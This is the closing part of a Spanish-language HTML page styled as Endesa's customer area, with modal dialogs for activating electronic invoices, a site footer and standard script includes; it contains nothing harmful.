						<span class="bold">Contrato vinculado</span>
					</h3>
				</div>
				<div class="MarginTop1em">
					<p class="textSmaller">
						Si lleva a cabo la desactivación de la factura digital para este contrato se desactivarán también los contratos&nbsp;<span id="txtContratosVincDesact"></span>
					</p>
				</div>
			</div>
		</div>
		</dialog>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="selectOneContract" data-configmodal="6" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
			<div class="mod_info_box mod_info_box_paddingTop1con5 block1">
				<article class="mod_info_content mod_cols">
					<div class="mod_cols mod_colsW100">
						<div class="notification prohibido">
							<div class="eInvoice_state_head">
								<h4 class="textNormal bold alertText">
									No ha seleccionado ningún contrato para activar la factura electrónica</h4>
							</div>
							<div class="MarginTop2em">
								<p class="textSmall typeG6 bold">Activa la factura electrónica en tus contratos.</p>
								<br> <a href="javascript:void(0);" title="cerrar" onclick="closeModal('selectOneContract')" class="displayInlineBlock MarginTop1em buttonTipo1 textSmaller">cerrar</a>
							</div>
						</div>
					</div>
				</article>
			</div>
		</div>
		</dialog>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="acceptTermsConditionsWFD" data-configmodal="7" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
			<div class="notification error">
				<div class="mod_cols mod_colsW100">
					<div class="eInvoice_state_head">
						<p class="textNormal bold textOrange">Estás activando la factura electrónica</p>
					</div>
					<div class="MarginLeft1em">
						<p class="textParragraph MarginTop2em textSmall bold"></p>
						<ul class="listCkeckOrange">
							<li class="textSmaller typeC3">Te avisamos en cuanto esté disponible y podrás consultar tu factura en el momento.</li>
							<li class="textSmaller typeC3">Accede a tu factura de una forma rápida desde tu email</li>
							<li class="textSmaller typeC3">Respeta el medio ambiente</li>
						</ul>
					</div>
					<div class="MarginLeft1em">
						<fieldset class="MarginTopLeft1em">
							<label id="reduceCheck" for="checkboxAceptarCond" class="labelItem labelNoAfter 
											">
								<span class="titleLabel textSmaller typeC2 "><a href="#" class="marginLeft0con5em_M" target="_top">condiciones de la factura electrónica.</a></span>
							<span class="CI_container " style="position: relative;"><span aria-hidden="true" tabindex="0" class="CI_customInput CI_checkbox" role="checkbox" style="z-index: 10;"></span><input class="checkbox CI_nativeInput" name="checkboxAceptarCondWFD" id="checkboxAceptarCondWFD" value="si" style="position: absolute; top: 0px; left: 0px; opacity: 0; z-index: 1;" type="checkbox"></span></label>
						</fieldset>
					</div>
					<input id="activateDigitalBillConfirmWFD" style="background-color: rgb(220, 220, 220);" class="MarginTopLeft1em buttonTipo1 displayInlineBlock textSmaller070em" disabled="disabled" value="Confirmar" type="button"> <a class="textSmaller" href="javascript:void(0);" onclick="$('#acceptTermsConditionsWFD').dialog('close');" id="cancelActivation" title="Cancelar">
						Cancelar </a>
				</div>
			</div>
		</div>
		</dialog>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="termsAndConditionsWFD" data-configmodal="8" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
			<div class="mod_cols mod_colsW100">
				<div class="mod_cols_top mod_cols_top_border">
					<h4 class="textBig">
						<span class="bold">Condiciones</span>
						de la factura electrónica
					</h4>
				</div>
				<div class="MarginTop1em scroll-pane height400 boxed">
					<p> Descargar condiciones de la <a href="#" target="_top">Factura electrónica</a></p>
				</div>
				<div class="col colPaddingRight0">
					<a class="CM-modal_close textSmaller buttonContrast buttonContrastSinFlecha azul" href="javascript:void(0);" onclick="closeModal('termsAndConditionsWFD')" title="cerrar">
						cerrar </a>
				</div>
			</div>
		</div>
		</dialog>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="digitalBillInfoWFD" data-configmodal="9" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
			<div class="mod_cols mod_colsW100">
				<div class="mod_cols_top mod_cols_top_border">
					<h4 class="textBig">
						<span class="bold">¿Qué es</span>
						la factura electrónica?
					</h4>
				</div>
				<div class="MarginTop1em scroll-pane height400 boxed">
					<p>La factura electrónica recoge los mismos datos que la factura que recibes en papel y la puedes visualizar con la misma apariencia, además incluye una firma electrónica que te garantiza la autenticidad del emisor y la integridad de su contenido.</p>
				</div>
				<div class="col colPaddingRight0">
					<a class="CM-modal_close textSmaller buttonContrast buttonContrastSinFlecha azul" href="javascript:void(0);" onclick="closeModal('digitalBillInfoWFD')" title="cerrar">cerrar</a>
				</div>
			</div>
		</div>
		</dialog>
	</section>
    </div>
                        </div>
	                </div>
	                </div>
	            </section>
                    <!--Llamada Modelo347-->
				 <footer class="pie mod_footer">
	<div class="mod_footer_top lista_desplegable_b">
		<div class="wrapper">
		    <div class="footer_line">
	        	<a class="textSmall arrow" href="#" title="Volver Arriba">
	        		<span class="arrowUp"></span>Volver Arriba
	        	</a>
	<!-- Obtenemos el id de la home -->
						<ul class="line">		
				<li class="line_column">
					<h4 class="textSmall bold gris3">Conócenos</h4>
					<ul class="footer_lnk_block level2">
												<li>
													<a class="textSmall" href="#" title="Conoce Endesa">Conoce Endesa</a>
												</li>
												<li>
													<a class="textSmall" href="#" title="Nuestra historia">Nuestra historia</a>
												</li>
					</ul>
				</li>
				<li class="line_column">
					<h4 class="textSmall bold gris3">Acceso</h4>
					<ul class="footer_lnk_block level2">
												<li>
													<a class="textSmall" href="#" title="Acceso con DNI electrónico">Acceso con DNI electrónico</a>
												</li>
					</ul>
				</li>
				<li class="line_column">
					<h4 class="textSmall bold gris3">Nuestro Blog</h4>
					<ul class="footer_lnk_block level2">
												<li>
													<a class="textSmall" href="#" title="Últimos artículos">Últimos artículos</a>
												</li>
												<li>
													<a class="textSmall" href="#" title="Promociones y ganadores">Promociones y ganadores</a>
												</li>
					</ul>
				</li>
						</ul>
						<ul class="line">		
				<li class="line_column">
					<h4 class="textSmall bold gris3">Consulta nuestras FAQs</h4>
					<ul class="footer_lnk_block level2">
												<li>
													<a class="textSmall" href="#" title="Preguntas frecuentes">Preguntas frecuentes</a>
												</li>
					</ul>
				</li>
				<li class="line_column">
					<h4 class="textSmall bold gris3">Nuestro compromiso</h4>
					<ul class="footer_lnk_block level2">
												<li>
													<a class="textSmall" href="#" title="Carta de servicio AENOR">Carta de servicio AENOR</a>
												</li>
					</ul>
				</li>
				<li class="line_column">
					<h4 class="textSmall bold gris3">Nuestras APPs</h4>
					<ul class="footer_lnk_block level2">
												<li>
													<a class="textSmall" href="#" title="App Endesa Clientes">App Endesa Clientes</a>
												</li>
												<li>
													<a class="textSmall" href="#" title="Descarga software visor">Descarga software visor</a>
												</li>
					</ul>
				</li>
						</ul>
			</div>
			<div class="footer_column">
    <ul class="footerDrops">
        <li class="navigator_menu">
                    <!-- inicio cambio accesibilidad -->
                    <ul class="footer_lnk_block">
                        <li class="dropdown">
                            <a href="#" class="textSmall bold desplegable CM_acceso_footer">
                                Endesa en el mundo
                            </a>
                            <ul class="dropdown_container CM_acceso_footer accessible outH">
                            <!-- fincambio accesibilidad -->
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Alemania" onclick="" target="_top">
				Alemania
			</a>
                                        </li>
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Benelux" onclick="" target="_top">
				Benelux
			</a>
                                        </li>
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Francia" onclick="" target="_top">
				Francia
			</a>
                                        </li>
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Portugal" onclick="" target="_top">
				Portugal
			</a>
                                        </li>
                            </ul>
                        </li>
                    </ul>
                    <!-- inicio cambio accesibilidad -->
                    <ul class="footer_lnk_block">
                        <li class="dropdown">
                            <a href="#" class="textSmall bold desplegable CM_acceso_footer">
                                Sitios Endesa
                            </a>
                            <ul class="dropdown_container CM_acceso_footer accessible outH">
                            <!-- fincambio accesibilidad -->
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Soluciones Integrales" onclick="" target="_top">
				Soluciones Integrales
			</a>
                                        </li>
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Endesa" onclick="" target="_top">
				Endesa
			</a>
                                        </li>
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Twenergy" onclick="" target="_top">
				Twenergy
			</a>
                                        </li>
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Vehículo eléctrico" onclick="" target="_top">
				Vehículo eléctrico
			</a>
                                        </li>
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Infoenergía" onclick="" target="_top">
				Infoenergía
			</a>
                                        </li>
                                        <li>
	        <a class="textSmaller" href="#" title="Ir a Liga Endesa" onclick="" target="_top">
				Liga Endesa
			</a>
                                        </li>
                            </ul>
                        </li>
                    </ul>
       </li>
       <li class="ban">
	<a href="#" target="_self" title="Sello Premio CRC">
	</a>
       </li>
    </ul>
		    </div>
		</div>
	</div>
	<div class="mod_footer_bottom">
	    <div class="wrapper">
	        <div class="subpie">
		<div class="textSmaller semiBold subpiendesa">
		     Endesa S.A. <span class="bold">2018</span>
		</div>
		<!-- Obtenemos el id de la home -->
	    <div class="subpienel">
			<ul>               
						<li>
							<a class="textSmaller" href="#" title="Conoce la energía">Conoce la energía</a>
						</li> 
						<li>
							<span class="footerSeparator"> - </span>							
							<a class="textSmaller" href="#" title="Mapa del sitio">Mapa del sitio</a>
						</li> 
						<li>
							<span class="footerSeparator"> - </span>							
							<a class="textSmaller" href="#" title="Seguridad">Seguridad</a>
						</li> 
						<li>
							<span class="footerSeparator"> - </span>							
							<a class="textSmaller" href="#" title="Accesibilidad">Accesibilidad</a>
						</li> 
						<li>
							<span class="footerSeparator"> - </span>							
							<a class="textSmaller" href="#" title="Aviso Legal">Aviso Legal</a>
						</li> 
						<li>
							<span class="footerSeparator"> - </span>							
							<a class="textSmaller" href="#" title="Cookies en Endesa">Cookies en Endesa</a>
						</li>
				<li>
	            	<a class="textSmaller grupoEnel" href="#" title="Grupo Enel">
	            		Grupo Enel
	            	</a>
	        	</li>
			</ul>
		</div>
	        </div>
	    </div>
	</div>
		</footer>
			</div>
</div>
<script type="text/javascript">
            setTimeout(function() {
                var el = document.getElementById('cont');
                var e = document.getElementById('loading');
                if( el ) 
                    el.style.display = 'block';
                    e.style.display = 'none';
            }, 35000);
        </script>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="../src/bootstrap.min.js"></script>
</body>
</html>